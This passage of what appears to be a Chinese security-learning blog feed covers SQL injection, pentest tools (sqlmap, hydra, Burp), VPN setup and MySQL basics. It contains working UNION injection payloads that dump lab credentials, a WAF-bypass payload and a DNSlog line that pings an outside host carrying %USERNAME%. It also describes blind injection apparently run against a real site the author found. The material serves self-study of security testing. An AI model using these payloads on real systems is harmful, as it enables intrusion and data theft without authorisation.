0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26</p><p>9.综合使用前面8种方法</p><h3 id="dnslog-windows适用"><a href="#dnslog-windows适用" class="headerlink" title="dnslog(windows适用)"></a>dnslog(windows适用)</h3><p>在<a href="http://ceye.io/profile" target="_blank" rel="noopener">http://ceye.io/profile</a> 上注册一个账号</p><p>payload:ping %USERNAME%.b182oj.ceye.io</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;前言:上次了解了基础的手工注入，本次继续补充手工注入方法&lt;/p&gt;
&lt;h3 id=&quot;insert注入&quot;&gt;&lt;a href=&quot;#insert注入&quot; class=&quot;headerlink&quot; title=&quot;insert注入&quot;&gt;&lt;/a&gt;insert注入&lt;/h3&gt;&lt;p&gt;sql语句inser
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>sql注入之手工注入基础</title>
    <link href="https://wocao828.github.io/2018/12/31/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/"/>
    <id>https://wocao828.github.io/2018/12/31/sql注入之手工注入基础/</id>
    <published>2018-12-31T08:30:53.000Z</published>
    <updated>2019-01-01T14:11:15.859Z</updated>
    
    <content type="html"><![CDATA[<p>sql注入是最常见的一种漏洞，本次介绍手工注入及实战演练</p><h3 id="sql注入的两个条件"><a href="#sql注入的两个条件" class="headerlink" title="sql注入的两个条件"></a>sql注入的两个条件</h3><p>1.用户能控制输入的内容</p><p>2.web应用把用户输入的内容带到数据库中执行</p><h3 id="sql注入危害"><a href="#sql注入危害" class="headerlink" title="sql注入危害"></a>sql注入危害</h3><p>修改数据</p><p>获取数据</p><p>上传文件</p><p>读取文件</p><h3 id="sql注入万能密码"><a href="#sql注入万能密码" class="headerlink" title="sql注入万能密码"></a>sql注入万能密码</h3><p>‘or 1=1#</p><h3 id="sql注入，从代码角度来看"><a href="#sql注入，从代码角度来看" class="headerlink" title="sql注入，从代码角度来看:"></a>sql注入，从代码角度来看:</h3><p>分为数字型和字符型</p><p>又根据字符和数字可以外加()和字符能够使用双引号和单引号</p><p>1、select * from users where id = 1     纯数字型</p><p>2、select * from users where id = ‘1’   只加单引号</p><p>3、select * from users where id = “1”   指甲双引号</p><p>4、select * from users where (id = 1)   数字加括号</p><p>5、select * from users where (id = ‘1’) 双引号加括号</p><p>6、select * from users where (id = “1”) 单引号加括号</p><h3 id="从注入点的反馈类型可以分为"><a href="#从注入点的反馈类型可以分为" class="headerlink" title="从注入点的反馈类型可以分为:"></a>从注入点的反馈类型可以分为:</h3><p>union类型的注入</p><p>基于错误显示的注入</p><p>boolean盲注</p><p>时间盲注</p><h3 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数:"></a>常用函数:</h3><p>limit  0,1  限制输出结果的行数</p><p>version()</p><p>user()</p><p>database()</p><p>group_concat()</p><p>string   -&gt;   hex<br>需要加0x<br>    ～   -&gt;   0x7e</p><p>order by 1       通过指定的列数，进行排序</p><p>union select  联合查询    需要注意，两边的内容列数一致。</p><p>DISTINCT</p><p>mysql中information_schema库存放所有的数据库信息，是公用的（任何用户都可以访问）</p><p>information_schema.SCHEMATA     表中schema_name字段存放了所有的数据库名字</p><p>information_schema.TABLES       表中table_name字段存放了所有的表名字，table_schema字段存储表所属的库名字</p><p>information_schema.COLUMNS      表column_name中存放了所有的字段名字，table_name字段存放了所属表的名字，table_schema字段存储表所属的库名字</p><p>查询数据库中有那些库select schema_name from information_schema.SCHEMATA</p><p>查询数据库中有那些表select table_name from information_schema.TABLES</p><p>查询数据库中test库中有哪些表select table_name from information_schema.TABLES where table_schema = ‘test’  // test 可以写成 0x7a73</p><p>查询数据库中有那些字段select column_name from information_schema.COLUMNS</p><p>查询数据库中test库中user表有哪些字段select column_name from information_schema.COLUMNS where table_schema = ‘test’ and table_name = ‘user’</p><p>知道了库的名字，表的名字，字段的名字，然后该干什么</p><p>猜解内容</p><p>select pass from test.user;</p><h3 id="进行快速测试"><a href="#进行快速测试" class="headerlink" title="进行快速测试"></a>进行快速测试</h3><p><img src="/2018/12/31/sql注入之手工注入基础/1.png" alt="1"></p><h3 id="一次union类型的注入的测试"><a href="#一次union类型的注入的测试" class="headerlink" title="一次union类型的注入的测试"></a>一次union类型的注入的测试</h3><p><a href="http://192.168.11.215:8003/Less-1/?id=1&#39;" target="_blank" rel="noopener">http://192.168.11.215:8003/Less-1/?id=1&#39;</a><br>出现问题，可能存在注入</p><p><a href="http://192.168.11.215:8003/Less-1/?id=1&#39;" target="_blank" rel="noopener">http://192.168.11.215:8003/Less-1/?id=1&#39;</a> %23<br>加%23后恢复正常，可以判断为’1’注入</p><p><a href="http://192.168.11.215:8003/Less-1/?id=1&#39;" target="_blank" rel="noopener">http://192.168.11.215:8003/Less-1/?id=1&#39;</a> order by 1 %23<br>使用order by 1   2   3   4  进行测试，发现查询的结果为3列，方便后续使用union select</p><p><a href="http://192.168.11.215:8003/Less-1/?id=1&#39;" target="_blank" rel="noopener">http://192.168.11.215:8003/Less-1/?id=1&#39;</a> union select 1,2,3 %23<br>发现页面不显示union select的内容，尝试使用limit或者是将前边的内容改为空</p><p><a href="http://192.168.11.215:8003/Less-1/?id=1&#39;" target="_blank" rel="noopener">http://192.168.11.215:8003/Less-1/?id=1&#39;</a> union select 1,2,3 limit 1,1 %23</p><p><a href="http://192.168.11.215:8003/Less-1/?id=-1&#39;" target="_blank" rel="noopener">http://192.168.11.215:8003/Less-1/?id=-1&#39;</a> union select 1,2,3 %23<br>可以显示union select后的内容，2和3是显示结果的地方</p><p><a href="http://192.168.11.215:8003/Less-1/?id=-1&#39;" target="_blank" rel="noopener">http://192.168.11.215:8003/Less-1/?id=-1&#39;</a> union select 1,user(),database() %23<br>把2 和3  位改为user()和database()发现可以显示用户和数据库</p><p><a href="http://192.168.11.215:8003/Less-1/?id=-1&#39;" target="_blank" rel="noopener">http://192.168.11.215:8003/Less-1/?id=-1&#39;</a> union select 1,user(),(select group_concat(schema_name) from information_schema.SCHEMATA) %23</p><p>尝试直接将查询数据库的语句放入到3位，发现执行错误，尝试在sql语句两侧加入(),发现还是错误，再加入group_concat，返现正常查询出所有的数据库名字。</p><p>首先关于直接放sql语句，这个是不符合代码规范， 需要用()扩起来</p><p>加入group_concat恢复正常，是因为查询所有的库名字时，返回的结果是多行，而union select 的第3位，是只能写单行内容，所以用group_concat进行组合成一行。// information_schema,challenges,mysql,performance_schema,security</p><p><a href="http://192.168.11.215:8003/Less-1/?id=-1&#39;" target="_blank" rel="noopener">http://192.168.11.215:8003/Less-1/?id=-1&#39;</a> union select 1,user(),(select group_concat(table_name) from information_schema.TABLES where table_schema = ‘security’) %23<br>查询出security库中所有的表名</p><p>// emails,referers,uagents,users</p><p><a href="http://192.168.11.215:8003/Less-1/?id=-1&#39;" target="_blank" rel="noopener">http://192.168.11.215:8003/Less-1/?id=-1&#39;</a> union select 1,user(),(select group_concat(column_name) from information_schema.COLUMNS where table_schema = ‘security’ and table_name = ‘users’) %23        查询处security库中users表所有的字段名字</p><p>//  id,username,password</p><p>查询security库中users表中的数据<br><a href="http://192.168.11.215:8003/Less-1/?id=-1&#39;" target="_blank" rel="noopener">http://192.168.11.215:8003/Less-1/?id=-1&#39;</a> union select 1,user(),( select group_concat(id,0x7e,username,0x7e,password) from security.users ) %23</p><p>select group_concat(id,0x7e,username,0x7e,password) from security.users</p><p>~Dumb~Dumb,2~Angelina~I-kill-you,3~Dummy~p@ssword,4~secure~crappy,5~stupid~stupidity,6~superman~genious,7~batman~moble,8~admin~admin,9~admin1~admin1,10~admin2~admin2,11~admin3~admin3,12~dhakkan~dumbo,14~admin4~admin4</p><p><a href="http://192.168.11.215:8003/Less-1/?id=-1&#39;" target="_blank" rel="noopener">http://192.168.11.215:8003/Less-1/?id=-1&#39;</a> union select 1,user(),( select group_concat(<em>) from security.users ) %23直接出错，因为</em> 不能使用group_concat函数进行组合。</p><h3 id="一次基于boolean盲注的测试"><a href="#一次基于boolean盲注的测试" class="headerlink" title="一次基于boolean盲注的测试"></a>一次基于boolean盲注的测试</h3><p>1.我找到一个纯数字型注入的网站，然后开始盲注,数据库名长度大于11，没有报错<br><img src="/2018/12/31/sql注入之手工注入基础/2.png" alt="2"><br>2.大于12就报错<br><img src="/2018/12/31/sql注入之手工注入基础/3.png" alt="3"><br>3.于是数据库名字长度为12<br><img src="/2018/12/31/sql注入之手工注入基础/4.png" alt="4"><br>4.通过此方法，我发现数据库名第一个字符为ascii中的121，即y<br><img src="/2018/12/31/sql注入之手工注入基础/5.png" alt="5"><br>5.循环如此，便可找到数据库名，表名等信息。</p><h4 id="第二个boolean盲注的测试"><a href="#第二个boolean盲注的测试" class="headerlink" title="第二个boolean盲注的测试"></a>第二个boolean盲注的测试</h4><p>1.与上一个相似，也是为纯数字型注入的网站，然后开始盲注,数据库名长度为14.<br><img src="/2018/12/31/sql注入之手工注入基础/6.png" alt="6"><br>2.找数据库名的第一个字符，大于ascii的120，页面正常。<br><img src="/2018/12/31/sql注入之手工注入基础/7.png" alt="7"><br>3.数据库名的第一个字符，大于ascii的121，页面不正常。<br><img src="/2018/12/31/sql注入之手工注入基础/8.png" alt="8"><br>4.通过此方法，我发现数据库名第一个字符为ascii中的121，即y<br><img src="/2018/12/31/sql注入之手工注入基础/9.png" alt="9"><br>5.循环如此，便可找到数据库名，表名等信息。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;sql注入是最常见的一种漏洞，本次介绍手工注入及实战演练&lt;/p&gt;
&lt;h3 id=&quot;sql注入的两个条件&quot;&gt;&lt;a href=&quot;#sql注入的两个条件&quot; class=&quot;headerlink&quot; title=&quot;sql注入的两个条件&quot;&gt;&lt;/a&gt;sql注入的两个条件&lt;/h3&gt;&lt;p&gt;1.
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>其他工具的简单使用</title>
    <link href="https://wocao828.github.io/2018/12/31/%E5%85%B6%E4%BB%96%E5%B7%A5%E5%85%B7%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/"/>
    <id>https://wocao828.github.io/2018/12/31/其他工具的简单使用/</id>
    <published>2018-12-31T08:25:16.000Z</published>
    <updated>2019-01-04T13:28:51.629Z</updated>
    
    <content type="html"><![CDATA[<p>前言:今天学习使用了nmap,hydra,wireshark,awvs,pentestDB,sqlmap等一系列工具</p><h2 id="简单工具"><a href="#简单工具" class="headerlink" title="简单工具"></a>简单工具</h2><h3 id="信息收集类"><a href="#信息收集类" class="headerlink" title="信息收集类"></a>信息收集类</h3><h4 id="nmap-主机和端口扫描"><a href="#nmap-主机和端口扫描" class="headerlink" title="nmap:主机和端口扫描"></a>nmap:主机和端口扫描</h4><p>-sn  只主机扫描，不进行端口扫描</p><p>-Pn  跳过主机发现进行扫描</p><p>-ox  以xml格式输出</p><p>-p   指定端口</p><p>-sV  系统版本检测</p><p>-v   详细输出扫描情况</p><p>-O   尝试识别远程操作系统</p><h4 id="Google-hacker"><a href="#Google-hacker" class="headerlink" title="Google hacker"></a>Google hacker</h4><h4 id="常用网站等"><a href="#常用网站等" class="headerlink" title="常用网站等"></a>常用网站等</h4><h3 id="漏洞扫描类"><a href="#漏洞扫描类" class="headerlink" title="漏洞扫描类"></a>漏洞扫描类</h3><h4 id="awvs扫描工具"><a href="#awvs扫描工具" class="headerlink" title="awvs扫描工具"></a>awvs扫描工具</h4><p>主要功能模块</p><p>1.Blind SQL Injector：盲注工具</p><p>2.HTTP Editor：http协议数据包编辑器</p><p>3.WebScanner：Web安全漏洞扫描（核心功能）</p><p>4.Site Crawler：遍历站点目录结构（爬虫功能）</p><p>5.HTTP Sniffer：HTTP协议嗅探器</p><p>6.HTTP Fuzzer：模糊测试工具</p><p>7.Authentication Tester：Web认证破解工具</p><p>8.Target Finder：端口扫描，找出web服务器端口（如80，443）</p><p>9.Subdomain Scanner：子域名扫描器，利用DNS查询使用方法</p><p>主要操作方法</p><p>1.new scan创建页面，如下图<br><img src="/2018/12/31/其他工具的简单使用/1.jpg" alt="1"></p><p>2.填写需要测试的网址，如下图，点击”Next”<br><img src="/2018/12/31/其他工具的简单使用/2.jpg" alt="2"></p><p>3.根据不同要求，选择测试类型，一般默认选择Default，点击“Next”<br><img src="/2018/12/31/其他工具的简单使用/3.jpg" alt="3"></p><p>4.自动识别出被测站点的相关信息，此时可直接点击“Next”<br><img src="/2018/12/31/其他工具的简单使用/4.jpg" alt="4"></p><p>5.可直接输入登录网站所需的账户名和密码，然后AWVS用自动探测技术进行识别，不需要手工录入登录过程<br><img src="/2018/12/31/其他工具的简单使用/5.jpg" alt="5"></p><p>6.开始边遍历被测网站的目录结构，边探测漏洞<br><img src="/2018/12/31/其他工具的简单使用/6.jpg" alt="6"><br><img src="/2018/12/31/其他工具的简单使用/7.jpg" alt="7"></p><p>7.扫描过程中，可以点击右上角暂停（Pause）or停止（Stop），Stop代表停止本次扫描<br><img src="/2018/12/31/其他工具的简单使用/8.jpg" alt="8"></p><p>8.待完全停止or结束扫描之后，目录结构上方的工具栏图标颜色由暗变明，点击“Report”-“Yes”：将扫描结果插入AWVS内置的数据库中<br><img src="/2018/12/31/其他工具的简单使用/9.jpg" alt="9"></p><p>9.根据不同要求，选择不同阅读者双方的报告，可生成不同类型的报告和细则，然后点击导出报告的图标，选择不同的格式，即可导出此次安全扫描的报告<br><img src="/2018/12/31/其他工具的简单使用/10.jpg" alt="10"></p><p>10.扫描结果并不代表完全真实可靠，还需要依靠人工再次验证判断。</p><h4 id="appscan等"><a href="#appscan等" class="headerlink" title="appscan等"></a>appscan等</h4><h3 id="sql注入类"><a href="#sql注入类" class="headerlink" title="sql注入类"></a>sql注入类</h3><h4 id="sqlmap-常用的一个注入工具"><a href="#sqlmap-常用的一个注入工具" class="headerlink" title="sqlmap(常用的一个注入工具)"></a>sqlmap(常用的一个注入工具)</h4><p>基础用法：</p><p>python sqlmap.py -u “注入地址” -v 1 –dbs   // 列举数据库</p><p>python sqlmap.py -u “注入地址” -v 1 –current-db   // 当前数据库</p><p>python sqlmap.py -u “注入地址” -v 1 –users    // 列数据库用户</p><p>python sqlmap.py -u “注入地址” -v 1 –current-user  // 当前用户</p><p>python sqlmap.py -u “注入地址” -v 1 –tables -D “数据库”   // 列举数据库的表名</p><p>python sqlmap.py -u “注入地址” -v 1 –columns -T “表名” -D “数据库”   // 获取表的列名</p><p>python sqlmap.py -u “注入地址” -v 1 –dump -C “字段,字段” -T “表名” -D “数据库”   // 获取表中的数据</p><p>sqlmap post注入：</p><ol><li><p>浏览器打开目标地址http:// <a href="http://www.xxx.com" target="_blank" rel="noopener">www.xxx.com</a> /Login.asp</p></li><li><p>配置burp代理(127.0.0.1:8080)以拦截请求</p></li><li><p>点击login表单的submit按钮</p></li><li><p>这时候Burp会拦截到了我们的登录POST请求</p></li><li><p>把这个post请求复制为txt, 我这命名为search-test.txt 然后把它放至sqlmap目录下</p></li><li><p>运行sqlmap并使用如下命令： ./sqlmap.py -r search-test.txt -p tfUPass</p></li></ol><p>sqlmap  cookies注入</p><p>sqlmap.py -u “<a href="http://127.0.0.1/base.php”" target="_blank" rel="noopener">http://127.0.0.1/base.php”</a> –cookies “id=1″  –dbs –level 2</p><p>sqlmap 编码绕waf注入</p><p>sqlmap.py -u “” -v 3  –tamper “space2morehash.py”</p><h4 id="啊D等"><a href="#啊D等" class="headerlink" title="啊D等"></a>啊D等</h4><h3 id="综合类"><a href="#综合类" class="headerlink" title="综合类"></a>综合类</h3><h4 id="burpsuite等-burpsuite基础使用看上一篇"><a href="#burpsuite等-burpsuite基础使用看上一篇" class="headerlink" title="burpsuite等(burpsuite基础使用看上一篇)"></a>burpsuite等(burpsuite基础使用看上一篇)</h4><h3 id="爆破类"><a href="#爆破类" class="headerlink" title="爆破类"></a>爆破类</h3><h4 id="hydra-一款开源暴力破解工具"><a href="#hydra-一款开源暴力破解工具" class="headerlink" title="hydra(一款开源暴力破解工具)"></a>hydra(一款开源暴力破解工具)</h4><p>-I 指定的用户名</p><p>-s 指定端口</p><p>-p 指定的密码</p><p>-P 指定的密码字典</p><p>-e ns 空密码试验</p><p>-o 指定结果输出文件</p><p>-f 破解后立即终止</p><p>-t 设置线程数</p><p>-v 显示过程</p><h3 id="社工类"><a href="#社工类" class="headerlink" title="社工类"></a>社工类</h3><h4 id="pentestDB"><a href="#pentestDB" class="headerlink" title="pentestDB"></a>pentestDB</h4><p>使用帮助文档<br><img src="/2018/12/31/其他工具的简单使用/11.jpg" alt="11"><br><img src="/2018/12/31/其他工具的简单使用/12.jpg" alt="12"></p><h3 id="抓包类"><a href="#抓包类" class="headerlink" title="抓包类"></a>抓包类</h3><h4 id="wireshark-网络抓包工具"><a href="#wireshark-网络抓包工具" class="headerlink" title="wireshark(网络抓包工具)"></a>wireshark(网络抓包工具)</h4><p>基础使用<br><img src="/2018/12/31/其他工具的简单使用/13.jpg" alt="13"><br>过滤使用<br><img src="/2018/12/31/其他工具的简单使用/14.jpg" alt="14"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;前言:今天学习使用了nmap,hydra,wireshark,awvs,pentestDB,sqlmap等一系列工具&lt;/p&gt;
&lt;h2 id=&quot;简单工具&quot;&gt;&lt;a href=&quot;#简单工具&quot; class=&quot;headerlink&quot; title=&quot;简单工具&quot;&gt;&lt;/a&gt;简单工具&lt;/h2
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>burpsuite的简单使用</title>
    <link href="https://wocao828.github.io/2018/12/31/burpsuite%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/"/>
    <id>https://wocao828.github.io/2018/12/31/burpsuite的简单使用/</id>
    <published>2018-12-31T08:22:33.000Z</published>
    <updated>2018-12-31T14:42:51.864Z</updated>
    
    <content type="html"><![CDATA[<p>前言:burpsuite是一个非常强大的工具，本次简述burpsuite的简单使用</p><h3 id="proxy模块"><a href="#proxy模块" class="headerlink" title="proxy模块"></a>proxy模块</h3><p>1.首先打开burpsuite，出现主界面如图:<br><img src="/2018/12/31/burpsuite的简单使用/1.jpg" alt="1"><br>2.下面介绍proxy模块<br><img src="/2018/12/31/burpsuite的简单使用/2.jpg" alt="2"><br>3.配置代理，选择option的127.0.0.1:8080<br><img src="/2018/12/31/burpsuite的简单使用/3.jpg" alt="3"><br>4.打开浏览器的代理配置，我选择火狐浏览器<br><img src="/2018/12/31/burpsuite的简单使用/4.jpg" alt="4"><br><img src="/2018/12/31/burpsuite的简单使用/5.jpg" alt="5"></p><p>5.将intercept is on 开始抓包<br><img src="/2018/12/31/burpsuite的简单使用/6.jpg" alt="6"><br>6.发现不能抓https的包，现在进行设置，先从burp中导出证书。</p><p>7.打开浏览器的高级选项<br><img src="/2018/12/31/burpsuite的简单使用/7.jpg" alt="7"><br>8.选择导入证书<br><img src="/2018/12/31/burpsuite的简单使用/8.jpg" alt="8"><br>9.下面四个模块为proxy的四个功能<br><img src="/2018/12/31/burpsuite的简单使用/9.jpg" alt="9"><br>Forward:将请求包发送</p><p>Drop:丢掉请求包</p><p>Intercept is on/off:截断的开关</p><p>Action对请求包的一些操作</p><p>10.Params模式<br><img src="/2018/12/31/burpsuite的简单使用/10.jpg" alt="10"><br>11.haeder模式<br><img src="/2018/12/31/burpsuite的简单使用/11.jpg" alt="11"><br>12.hex也就是16进制模式<br><img src="/2018/12/31/burpsuite的简单使用/12.jpg" alt="12"><br>13.history模块<br><img src="/2018/12/31/burpsuite的简单使用/13.jpg" alt="13"></p><h3 id="target模块"><a href="#target模块" class="headerlink" title="target模块"></a>target模块</h3><p>Target 作为 Burp 的第一个模块，作用是一个站点地图，会在左侧出现所有通过代理服务器的网页都会在此显示</p><p>“Target” 功能模块已经将所有访问记录给爬取了下来，并显示在左侧，如图所示。<br><img src="/2018/12/31/burpsuite的简单使用/14.jpg" alt="14"></p><h3 id="scanner模块"><a href="#scanner模块" class="headerlink" title="scanner模块"></a>scanner模块</h3><p>Scan 这个功能模块的作用则是漏洞扫描，免费版没有此功能。</p><p>scan有主动扫描和被动扫描<br><img src="/2018/12/31/burpsuite的简单使用/15.jpg" alt="15"></p><h3 id="intruder模块"><a href="#intruder模块" class="headerlink" title="intruder模块"></a>intruder模块</h3><p>Intruder 模块则是整个 Burp 工具里最有用的一块，在暴力破解这方面经常会上手，可以通过增加一个字典来实现自动化的攻击<br><img src="/2018/12/31/burpsuite的简单使用/16.jpg" alt="16"><br>Attack type 里的参数有四种，分别是如下图所示<br><img src="/2018/12/31/burpsuite的简单使用/17.jpg" alt="17"><br>Payload，作用是导入字典的作用<br><img src="/2018/12/31/burpsuite的简单使用/18.jpg" alt="18"><br>在这个模块下的 Simple list 定义则是最基础的，适合小量数据<br><img src="/2018/12/31/burpsuite的简单使用/19.jpg" alt="19"></p><h3 id="Repeater模块"><a href="#Repeater模块" class="headerlink" title="Repeater模块"></a>Repeater模块</h3><p>主要就是修改请求的各项参数等等然后点击左上角的 go 发送出去，然后在右边接受到请求，同时在右侧显示请求和状态，多作用于的 HTTP 请求的模糊测试<br><img src="/2018/12/31/burpsuite的简单使用/20.jpg" alt="20"></p><h3 id="spider模块"><a href="#spider模块" class="headerlink" title="spider模块"></a>spider模块</h3><p>是一个应用智能感应的网络爬虫，它能完整的枚举应用程序的内容和功能<br><img src="/2018/12/31/burpsuite的简单使用/21.jpg" alt="21"><br>Contro用来开始和停止 Burp Spider，监视它的进度，以及定义 spidering 的范围<br><img src="/2018/12/31/burpsuite的简单使用/22.jpg" alt="22"></p><h3 id="Decoder模块"><a href="#Decoder模块" class="headerlink" title="Decoder模块"></a>Decoder模块</h3><p>进行手动执行或对应用程序数据者智能解码编码的工具<br><img src="/2018/12/31/burpsuite的简单使用/23.jpg" alt="23"></p><h3 id="Comparer模块"><a href="#Comparer模块" class="headerlink" title="Comparer模块"></a>Comparer模块</h3><p>Burp Comparer在Burp Suite中主要提供一个可视化的差异比对功能，来对比分析两次数据之间的区别<br><img src="/2018/12/31/burpsuite的简单使用/24.jpg" alt="24"></p><h3 id="Extender模块"><a href="#Extender模块" class="headerlink" title="Extender模块"></a>Extender模块</h3><p>可以让你加载Burp Suite的扩展，使用你自己的或第三方代码来扩展Burp Suit的功能</p><h3 id="Options模块"><a href="#Options模块" class="headerlink" title="Options模块"></a>Options模块</h3><p>对Burp Suite的一些设置</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;前言:burpsuite是一个非常强大的工具，本次简述burpsuite的简单使用&lt;/p&gt;
&lt;h3 id=&quot;proxy模块&quot;&gt;&lt;a href=&quot;#proxy模块&quot; class=&quot;headerlink&quot; title=&quot;proxy模块&quot;&gt;&lt;/a&gt;proxy模块&lt;/h3&gt;&lt;p&gt;1
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>新手搭建vpn</title>
    <link href="https://wocao828.github.io/2018/12/30/%E6%96%B0%E6%89%8B%E6%90%AD%E5%BB%BAvpn/"/>
    <id>https://wocao828.github.io/2018/12/30/新手搭建vpn/</id>
    <published>2018-12-30T05:53:09.000Z</published>
    <updated>2018-12-30T06:17:21.595Z</updated>
    
    <content type="html"><![CDATA[<p>前言:如何搭建vpn，本篇将具体阐述</p><h2 id="Windows服务器上搭建"><a href="#Windows服务器上搭建" class="headerlink" title="Windows服务器上搭建"></a>Windows服务器上搭建</h2><p>1.打开服务管理器—&gt;添加角色—-&gt;勾选“网络策略和访问服务 ”——&gt;下一步—–&gt;勾选”路由和远程访问服务”—&gt;开始安装</p><p>2.角色中出现了“路由和远程访问”，现在是红色的，右键选择配置它，打开向导—&gt;选择自定义配置–&gt;服务里全选–&gt;完成–&gt;变成绿色</p><p>3.新增一个接口：ipv4–&gt;NAT—&gt;新建一个接口–&gt;选择要使用的网卡—&gt;接口类型选择“公用接口连接到Internet”,勾选“在此接口上启用NAT“</p><p>4.开始菜单–&gt;管理工具–&gt;网络策略服务器–&gt;策略–&gt;网络策略–&gt;把里面的两项被组织的属性改成“授予访问权限”</p><p>5.服务器管理器–&gt;配置–&gt;本地用户和组–&gt;添加一个用户–&gt;填写用户名、密码、勾选“用户不能更改密码”和“密码永不过期”，去掉“下次登陆须更改密码”的勾，点创建。</p><p>6.开始菜单–&gt;管理工具–&gt;本地安全策略–&gt;本地策略–&gt;用户权限分配–&gt;拒绝本地登陆，添加vpn用户—&gt;拒绝通过远程桌面登陆,添加vpn用户。</p><p>7.连接VPN：在客户机创建一个新连接–&gt;选择连接到工作区—&gt;使用我的internet连接–&gt;填写ip地址–&gt;填写之前创建的VPN用户名和密码–&gt;连接即可</p><h2 id="linux服务器上搭建vpn-本次实验使用ubuntu16-04"><a href="#linux服务器上搭建vpn-本次实验使用ubuntu16-04" class="headerlink" title="linux服务器上搭建vpn(本次实验使用ubuntu16.04)"></a>linux服务器上搭建vpn(本次实验使用ubuntu16.04)</h2><h3 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h3><p>1.检查更新<br>sudo apt-get update</p><p>2.输入命令<br>sudo apt-get install \</p><p>apt-transport-https \</p><p>ca-certificates \</p><p>curl \</p><p>software-properties-common</p><p>3.curl -fsSL <a href="https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu/gpg" target="_blank" rel="noopener">https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu/gpg</a> | sudo apt-key add -</p><p>4.sudo add-apt-repository \</p><p>“deb [arch=amd64] <a href="https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu" target="_blank" rel="noopener">https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu</a> \</p><p>$(lsb_release -cs) \</p><p>stable”</p><p>5.sudo apt-get update</p><p>6.sudo apt-get install docker-ce</p><p>7.vim /etc/docker/daemon.json<br>写入{<br>        “registry-mirrors”: [“<a href="https://registry.docker-cn.com&quot;]" target="_blank" rel="noopener">https://registry.docker-cn.com&quot;]</a><br>    }</p><p>8.重启docker<br>service docker restart</p><h3 id="搭建PPTP模式vpn"><a href="#搭建PPTP模式vpn" class="headerlink" title="搭建PPTP模式vpn"></a>搭建PPTP模式vpn</h3><p>1.用docker拉镜像<br>docker pull mobtitude/vpn-pptp</p><p>2.新建chap-secrets，写入</p><p>uname     <em>     upass    </em></p><p>3.运行docker</p><p>docker run -d –privileged –net host -v /root/chap-secrets:/etc/ppp/chap-secrets mobtitude/vpn-pptp</p><h3 id="搭建L2TP模式"><a href="#搭建L2TP模式" class="headerlink" title="搭建L2TP模式"></a>搭建L2TP模式</h3><p>1.用docker拉镜像<br>docker pull hwdsl2/ipsec-vpn-server</p><p>2.modprobe af_key</p><p>3.编辑vpn.env</p><p>写入VPN_IPSEC_PSK=qwerdf</p><p>VPN_USER=vpnuser</p><p>VPN_PASSWORD=vpnpassword</p><p>docker run –name vpn-docker –privileged –env-file /root/vpn.env -p 500:500/udp -p 4500:4500/udp -v /lib/modules:/lib/modules:ro  -d –privileged hwdsl2/ipsec-vpn-server</p><h3 id="shadowsocks"><a href="#shadowsocks" class="headerlink" title="shadowsocks"></a>shadowsocks</h3><p>1.下载shadowsocks</p><p>apt install shadowsocks -y</p><p>2.修改配置文件/etc/shadowsocks/config.json</p><p>vim /etc/shadowsocks/config.json</p><p>{<br>    “server”:”0.0.0.0”,</p><p>  “server_port”:8888,</p><p>“local_address”: “127.0.0.1”,</p><p> “local_port”:1080,</p><p> “password”:”123456”,</p><p>“timeout”:300,</p><p> “method”:”aes-256-cfb”,</p><p> “fast_open”: false,</p><p>  “workers”: 1,</p><p> “prefer_ipv6”: false</p><p>}</p><p>3.service shadowsocks restart</p><p>4.客户端连接</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;前言:如何搭建vpn，本篇将具体阐述&lt;/p&gt;
&lt;h2 id=&quot;Windows服务器上搭建&quot;&gt;&lt;a href=&quot;#Windows服务器上搭建&quot; class=&quot;headerlink&quot; title=&quot;Windows服务器上搭建&quot;&gt;&lt;/a&gt;Windows服务器上搭建&lt;/h2&gt;&lt;p&gt;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>mysql基础学习</title>
    <link href="https://wocao828.github.io/2018/12/23/mysql%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"/>
    <id>https://wocao828.github.io/2018/12/23/mysql基础学习/</id>
    <published>2018-12-23T11:54:02.000Z</published>
    <updated>2018-12-23T12:05:37.462Z</updated>
    
    <content type="html"><![CDATA[<p>前言:对数据库特别是mysql的学习</p><h3 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h3><p>一个用来存放数据的服务或者平台，要么以结构化(数据库、表、数据)形式存放，要么以非结构化(key=value)形式存储。</p><p>学生库(stu_db) –&gt;学生表(stu_table) –&gt;id、name、number、class<br>                1    zhang    21100      97<br>student.txt<br>id=1<br>name=zhang<br>number=21100<br>class=95</p><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><p>mysql(轻量级开源数据库，适用于中小型企业，性能较好)、SQL server(微软开发、适用于中大型企业，需要微软系统作为支撑、不支持跨平台)、Oracle(收费、适用于大型企业需求、支持跨平台、需要良好的硬件平台)</p><h3 id="数据库模型"><a href="#数据库模型" class="headerlink" title="数据库模型"></a>数据库模型</h3><p>关系型数据库(结构化)mysql/mssql/oracle/DB2</p><p>非关系型数据库(非结构化)redis/mongodb/hbase/nosql</p><h3 id="mysql设置环境变量"><a href="#mysql设置环境变量" class="headerlink" title="mysql设置环境变量"></a>mysql设置环境变量</h3><p>phpstudy修改mysql密码</p><p>dos登录mysql</p><p>mysql交互式窗口</p><p>mysql-front 